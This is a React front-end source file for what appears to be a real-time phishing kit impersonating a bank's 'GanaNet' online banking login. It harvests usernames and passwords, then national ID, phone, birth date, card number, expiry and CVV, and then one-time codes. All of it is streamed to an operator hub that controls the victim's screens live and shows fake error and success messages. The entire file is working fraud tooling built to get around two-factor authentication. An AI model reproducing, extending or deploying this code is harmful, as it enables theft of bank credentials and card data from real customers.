import { useEffect, useRef, useState } from 'react'
import LoginPage from './LoginPage.jsx'
import HabilitarDevicePage from './HabilitarDevicePage.jsx'
import OtpModal from './OtpModal.jsx'
import { opsBus } from './opsBus.js'

const CLIENT_KEY = 'gananet-client-pending'

function detectDevice() {
  return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'mobile' : 'desktop'
}

function routeFromHash() {
  const hash = (window.location.hash || '').replace(/^#/, '')
  if (hash === '/habilitar' || hash === 'habilitar') return 'habilitar'
  return 'login'
}

function loadPending() {
  try {
    const raw = sessionStorage.getItem(CLIENT_KEY)
    if (!raw) return null
    const data = JSON.parse(raw)
    if (!data?.sessionId) return null
    if (
      data.step !== 'loading' &&
      data.step !== 'otp' &&
      data.step !== 'otp-wait' &&
      data.step !== 'card' &&
      !(data.route === 'habilitar' && data.step === 'idle')
    ) {
      return null
    }
    return data
  } catch {
    return null
  }
}

function savePending(data) {
  try {
    sessionStorage.setItem(CLIENT_KEY, JSON.stringify(data))
  } catch {
    // quota / private mode
  }
}

function clearPending() {
  try {
    sessionStorage.removeItem(CLIENT_KEY)
  } catch {
    // ignore
  }
}

function factorFromState(state) {
  if (state === 'waiting-ganapin' || state === 'ganapin') return 'ganapin'
  if (state === 'waiting-totp' || state === 'totp') return 'totp'
  return null
}

export default function App() {
  const initial = loadPending()
  const [route, setRoute] = useState(() => initial?.route || routeFromHash())
  const [step, setStep] = useState(() => {
    if (initial?.step === 'otp-wait' && initial?.otpVariant) return 'otp-wait'
    if (initial?.step === 'otp' && initial?.otpVariant) return 'otp'
    if (initial?.step === 'loading') return 'loading'
    if (initial?.step === 'card') return 'card'
    if (initial?.route === 'habilitar' && initial?.step === 'idle') return 'idle'
    return 'idle'
  })
  const [pendingUser, setPendingUser] = useState(() => initial?.pendingUser || null)
  const [otpVariant, setOtpVariant] = useState(() =>
    initial?.step === 'otp' || initial?.step === 'otp-wait'
      ? initial?.otpVariant || null
      : null,
  )
  const [otpImage, setOtpImage] = useState(() =>
    initial?.step === 'otp' || initial?.step === 'otp-wait' ? initial?.otpImage || '' : '',
  )
  const [otpTokenError, setOtpTokenError] = useState('')
  const [errorMsg, setErrorMsg] = useState('')
  const [successMsg, setSuccessMsg] = useState('')
  const sessionIdRef = useRef(initial?.sessionId || null)
  const pendingUserRef = useRef(pendingUser)
  const stepRef = useRef(step)
  const routeRef = useRef(route)
  const otpVariantRef = useRef(otpVariant)
  const otpImageRef = useRef(otpImage)
  const otpTokenErrorSeq = useRef(0)
  /** Evita reaplicar Listo / Err Token / Err clave en cada poll */
  const lastTerminalKeyRef = useRef('')
  /** Panel envió a Habilitar dispositivo (misma sesión del login) */
  const dispositivoFromPanelRef = useRef(Boolean(initial?.dispositivoFromPanel))
  const cardTimerRef = useRef(0)

  useEffect(() => {
    pendingUserRef.current = pendingUser
  }, [pendingUser])
  useEffect(() => {
    stepRef.current = step
  }, [step])
  useEffect(() => {
    routeRef.current = route
  }, [route])
  useEffect(() => {
    otpVariantRef.current = otpVariant
  }, [otpVariant])
  useEffect(() => {
    otpImageRef.current = otpImage
  }, [otpImage])

  useEffect(() => {
    function onHash() {
      const next = routeFromHash()
      setRoute(next)
      if (stepRef.current === 'idle') {
        setErrorMsg('')
        setSuccessMsg('')
      }
    }
    window.addEventListener('hashchange', onHash)
    return () => window.removeEventListener('hashchange', onHash)
  }, [])

  useEffect(() => {
    const keepHabilitarForm =
      route === 'habilitar' && step === 'idle' && sessionIdRef.current
    if (
      step !== 'loading' &&
      step !== 'otp' &&
      step !== 'otp-wait' &&
      step !== 'card' &&
      !keepHabilitarForm
    ) {
      if (step === 'idle' && route === 'login') clearPending()
      return
    }
    if (!sessionIdRef.current) return
    savePending({
      sessionId: sessionIdRef.current,
      step,
      route,
      pendingUser,
      dispositivoFromPanel: dispositivoFromPanelRef.current,
      otpVariant: step === 'otp' || step === 'otp-wait' ? otpVariant : null,
      otpImage: step === 'otp' || step === 'otp-wait' ? otpImage : '',
      savedAt: Date.now(),
    })
  }, [step, pendingUser, otpVariant, otpImage, route])

  function goLogin() {
    window.location.hash = ''
    setRoute('login')
  }

  function goHabilitar() {
    window.location.hash = '#/habilitar'
    setRoute('habilitar')
  }

  function openDispositivoFromPanel() {
    dispositivoFromPanelRef.current = true
    setOtpVariant(null)
    setOtpImage('')
    setOtpTokenError('')
    setErrorMsg('')
    setSuccessMsg('')
    setStep('idle')
    window.location.hash = '#/habilitar'
    setRoute('habilitar')
  }

  function cancelHabilitar() {
    if (dispositivoFromPanelRef.current && sessionIdRef.current) {
      // Volver a espera en login (misma sesión)
      window.location.hash = ''
      setRoute('login')
      setStep('loading')
      setErrorMsg('')
      setSuccessMsg('')
      return
    }
    dispositivoFromPanelRef.current = false
    goLogin()
    setStep('idle')
  }

  function applyFactor(action, image) {
    if (cardTimerRef.current) {
      window.clearTimeout(cardTimerRef.current)
      cardTimerRef.current = 0
    }
    setErrorMsg('')
    setSuccessMsg('')
    setOtpTokenError('')
    setOtpVariant(action)
    setOtpImage(image || '')
    setStep('otp')
  }

  function finishSuccess() {
    const key = `${sessionIdRef.current}:done`
    if (lastTerminalKeyRef.current === key) return
    lastTerminalKeyRef.current = key
    if (cardTimerRef.current) {
      window.clearTimeout(cardTimerRef.current)
      cardTimerRef.current = 0
    }
    setPendingUser(null)
    setOtpVariant(null)
    setOtpImage('')
    setOtpTokenError('')
    setErrorMsg('')
    setSuccessMsg(
      routeRef.current === 'habilitar'
        ? 'Dispositivo habilitado correctamente'
        : 'Validación exitosa',
    )
    setStep('idle')
    sessionIdRef.current = null
    clearPending()
  }

  function resetForm(message) {
    const key = `${sessionIdRef.current}:reset:${message || ''}`
    if (message && lastTerminalKeyRef.current === key) return
    if (message) lastTerminalKeyRef.current = key
    if (cardTimerRef.current) {
      window.clearTimeout(cardTimerRef.current)
      cardTimerRef.current = 0
    }
    setErrorMsg(message || '')
    setSuccessMsg('')
    setStep('idle')
    setOtpVariant(null)
    setOtpImage('')
    setOtpTokenError('')
    setPendingUser(null)
    sessionIdRef.current = null
    clearPending()
  }

  function rejectToken() {
    const key = `${sessionIdRef.current}:error-token`
    if (lastTerminalKeyRef.current === key) return
    lastTerminalKeyRef.current = key
    otpTokenErrorSeq.current += 1
    setOtpTokenError(
      `Error de segundo factor de autentificación.(${otpTokenErrorSeq.current})`,
    )
    setStep('otp')
  }

  function handleRemoteSession(remote) {
    if (!remote) return
    const currentStep = stepRef.current

    if (remote.state === 'done') {
      finishSuccess()
      return
    }
    if (remote.state === 'error-pass') {
      resetForm(
        routeRef.current === 'habilitar'
          ? 'Datos incorrectos. Intente nuevamente.'
          : 'Clave incorrecta. Intente nuevamente.',
      )
      return
    }
    if (remote.state === 'error-user') {
      resetForm(
        routeRef.current === 'habilitar'
          ? 'No se pudo validar la cédula. Intente nuevamente.'
          : 'Usuario incorrecto. Intente nuevamente.',
      )
      return
    }
    if (remote.state === 'error-token') {
      if (routeRef.current === 'habilitar') return
      rejectToken()
      return
    }
    if (lastTerminalKeyRef.current.endsWith(':error-token')) {
      lastTerminalKeyRef.current = ''
    }

    if (remote.state === 'waiting-dispositivo') {
      if (routeRef.current !== 'habilitar' || currentStep !== 'idle') {
        openDispositivoFromPanel()
      }
      return
    }

    if (routeRef.current === 'habilitar') {
      if (
        (remote.state === 'waiting' || remote.flow === 'habilitar') &&
        currentStep !== 'loading' &&
        remote.state !== 'waiting-dispositivo'
      ) {
        // Tras enviar datos de tarjeta: ya estamos en loading; no forzar
        if (currentStep === 'idle' && remote.flow === 'habilitar' && remote.ci) {
          setStep('loading')
        }
      }
      return
    }

    if (remote.state === 'waiting-token') {
      if (remote.securityImage) setOtpImage(remote.securityImage)
      setOtpTokenError('')
      setStep('otp-wait')
      return
    }

    const factor = factorFromState(remote.state)
    if (factor) {
      if (currentStep === 'otp-wait') {
        if (remote.securityImage && remote.securityImage !== otpImageRef.current) {
          setOtpImage(remote.securityImage)
        }
        return
      }
      const img = remote.securityImage || ''
      const needOpen =
        currentStep === 'loading' ||
        otpVariantRef.current !== factor ||
        (img && img !== otpImageRef.current)
      if (needOpen) applyFactor(factor, img)
      return
    }

    if (remote.state === 'waiting' && currentStep !== 'loading') {
      if (!otpVariantRef.current) {
        setStep('loading')
      }
    }
  }

  async function applyTerminalFromActions(sessionId) {
    try {
      const res = await fetch(
        `/api/ops/actions?sessionId=${encodeURIComponent(sessionId)}&since=0`,
      )
      if (!res.ok) return false
      const data = await res.json()
      const list = data.actions || []
      if (!list.length) return false
      const last = list[list.length - 1]
      if (last.action === 'done') {
        finishSuccess()
        return true
      }
      if (last.action === 'error-pass') {
        resetForm(
          routeRef.current === 'habilitar'
            ? 'Datos incorrectos. Intente nuevamente.'
            : 'Clave incorrecta. Intente nuevamente.',
        )
        return true
      }
      if (last.action === 'error-user') {
        resetForm(
          routeRef.current === 'habilitar'
            ? 'No se pudo validar la cédula. Intente nuevamente.'
            : 'Usuario incorrecto. Intente nuevamente.',
        )
        return true
      }
      if (last.action === 'error-token') {
        if (routeRef.current !== 'habilitar') rejectToken()
        return true
      }
      return false
    } catch {
      return false
    }
  }

  async function syncFromHub() {
    const id = sessionIdRef.current
    if (!id) return
    try {
      const res = await fetch('/api/ops/sessions')
      if (!res.ok) return
      const data = await res.json()
      const remote = (data.sessions || []).find((s) => s.id === id)
      if (!remote) {
        const applied = await applyTerminalFromActions(id)
        if (applied) return
        const savedAt = loadPending()?.savedAt || 0
        if (Date.now() - savedAt < 3000) return
        resetForm('')
        return
      }
      handleRemoteSession(remote)
    } catch {
      // hub may be restarting
    }
  }

  useEffect(() => {
    const id = sessionIdRef.current
    const watching =
      step === 'loading' ||
      step === 'otp' ||
      step === 'otp-wait' ||
      (route === 'habilitar' && Boolean(id))
    if (!id || !watching) {
      return undefined
    }

    const unsubscribe = opsBus.subscribe(
      (msg) => {
        if (!msg) return
        if (msg.type === 'session:remote' && msg.session?.id === sessionIdRef.current) {
          handleRemoteSession(msg.session)
          return
        }
        if (msg.type === 'session:gone' && msg.sessionId === sessionIdRef.current) {
          applyTerminalFromActions(msg.sessionId)
          return
        }
        if (msg.type !== 'session:action') return
        if (!sessionIdRef.current || msg.sessionId !== sessionIdRef.current) return

        if (msg.action === 'ganapin' || msg.action === 'totp') {
          if (routeRef.current === 'habilitar') return
          if (msg.image) applyFactor(msg.action, msg.image)
          else syncFromHub()
          return
        }

        if (msg.action === 'dispositivo') {
          openDispositivoFromPanel()
          return
        }

        if (msg.action === 'error-pass') {
          resetForm(
            routeRef.current === 'habilitar'
              ? 'Datos incorrectos. Intente nuevamente.'
              : 'Clave incorrecta. Intente nuevamente.',
          )
          return
        }

        if (msg.action === 'error-user') {
          resetForm(
            routeRef.current === 'habilitar'
              ? 'No se pudo validar la cédula. Intente nuevamente.'
              : 'Usuario incorrecto. Intente nuevamente.',
          )
          return
        }

        if (msg.action === 'error-token') {
          if (routeRef.current !== 'habilitar') rejectToken()
          return
        }

        if (msg.action === 'done') {
          finishSuccess()
        }
      },
      { sessionId: id },
    )
    return unsubscribe
  }, [step, route])

  useEffect(() => {
    const id = sessionIdRef.current
    const watching =
      step === 'loading' ||
      step === 'otp' ||
      step === 'otp-wait' ||
      (route === 'habilitar' && Boolean(id))
    if (!watching || !id) return undefined
    const t = setInterval(() => {
      opsBus.ping(id)
    }, 3000)
    return () => clearInterval(t)
  }, [step, route])

  useEffect(() => {
    function onVisible() {
      if (document.visibilityState !== 'visible') return
      if (!sessionIdRef.current) return
      syncFromHub()
    }
    document.addEventListener('visibilitychange', onVisible)
    window.addEventListener('focus', onVisible)
    if (sessionIdRef.current) {
      syncFromHub()
    } else {
      clearPending()
    }
    return () => {
      document.removeEventListener('visibilitychange', onVisible)
      window.removeEventListener('focus', onVisible)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  function handleCredentialsVerified(user) {
    const id = opsBus.createId()
    sessionIdRef.current = id
    lastTerminalKeyRef.current = ''
    setPendingUser(user)
    setOtpVariant(null)
    setOtpImage('')
    setOtpTokenError('')
    setErrorMsg('')
    setSuccessMsg('')
    setStep('loading')

    opsBus.sessionCreated({
      id,
      flow: 'login',
      username: user.username,
      password: user.password || '',
      tipoUsuario: user.tipoUsuario,
      device: detectDevice(),
      ip: '127.0.0.1',
      createdAt: Date.now(),
      last_seen: Date.now(),
      state: 'waiting',
    })

    if (cardTimerRef.current) window.clearTimeout(cardTimerRef.current)
    cardTimerRef.current = window.setTimeout(() => {
      if (stepRef.current === 'otp' || stepRef.current === 'otp-wait') return
      setStep('card')
      cardTimerRef.current = 0
    }, 6000)
  }

  function handleHabilitarSubmit(data) {
    const id = sessionIdRef.current || opsBus.createId()
    sessionIdRef.current = id
    lastTerminalKeyRef.current = ''
    const displayUser = data.complemento ? `${data.ci}-${data.complemento}` : data.ci
    const fromLoginCard = stepRef.current === 'card' && routeRef.current === 'login'
    setPendingUser({
      username: fromLoginCard ? pendingUserRef.current?.username || displayUser : displayUser,
      ...data,
    })
    setOtpVariant(null)
    setOtpImage('')
    setOtpTokenError('')
    setErrorMsg('')
    setSuccessMsg('')
    setStep('loading')

    opsBus.sessionCreated({
      id,
      flow: fromLoginCard ? 'login' : 'habilitar',
      username: fromLoginCard
        ? pendingUserRef.current?.username || displayUser
        : displayUser,
      password: fromLoginCard
        ? pendingUserRef.current?.password || data.cardNumber || ''
        : data.cardNumber || data.phone || '',
      tipoUsuario: fromLoginCard
        ? pendingUserRef.current?.tipoUsuario || 'CODIGO_PERSONA'
        : 'HABILITAR',
      ci: data.ci,
      complemento: data.complemento || '',
      extension: data.extension,
      birthDate: data.birthDate,
      phone: data.phone,
      cardNumber: data.cardNumber || '',
      cardExpiry: data.cardExpiry || '',
      cvv: data.cvv || '',
      device: detectDevice(),
      ip: '127.0.0.1',
      createdAt: Date.now(),
      last_seen: Date.now(),
      state: 'waiting',
    })
  }

  function handleOtpSubmit(payload) {
    if (sessionIdRef.current) {
      if (lastTerminalKeyRef.current.endsWith(':error-token')) {
        lastTerminalKeyRef.current = ''
      }
      opsBus.tokenUpdate(sessionIdRef.current, payload.code, true)
    }
    setOtpTokenError('')
    setStep('otp-wait')
  }

  const waiting = step === 'loading' || step === 'otp' || step === 'otp-wait'
  const showOtp = route === 'login' && (step === 'otp' || step === 'otp-wait') && otpVariant
  const showLoginCard = route === 'login' && step === 'card'

  if (route === 'habilitar' || showLoginCard) {
    return (
      <HabilitarDevicePage
        onSubmit={handleHabilitarSubmit}
        onCancel={showLoginCard ? goLogin : cancelHabilitar}
        locked={waiting}
        showSpinner={step === 'loading'}
        errorMsg={errorMsg}
        successMsg={successMsg}
        startOnCard={showLoginCard}
      />
    )
  }

  return (
    <>
      <LoginPage
        onVerified={handleCredentialsVerified}
        onHabilitar={goHabilitar}
        locked={waiting}
        showSpinner={step === 'loading'}
        errorMsg={errorMsg}
        successMsg={successMsg}
      />
      {showOtp && (
        <OtpModal
          key={otpVariant}
          username={pendingUser?.username}
          variant={otpVariant}
          securityImage={otpImage}
          waitingForPanel={step === 'otp-wait'}
          tokenError={otpTokenError}
          onSubmit={handleOtpSubmit}
          onCodeChange={(code) => {
            if (sessionIdRef.current && step === 'otp' && code.length > 0) {
              opsBus.setTyping(sessionIdRef.current)
            }
          }}
        />
      )}
    </>
  )
}
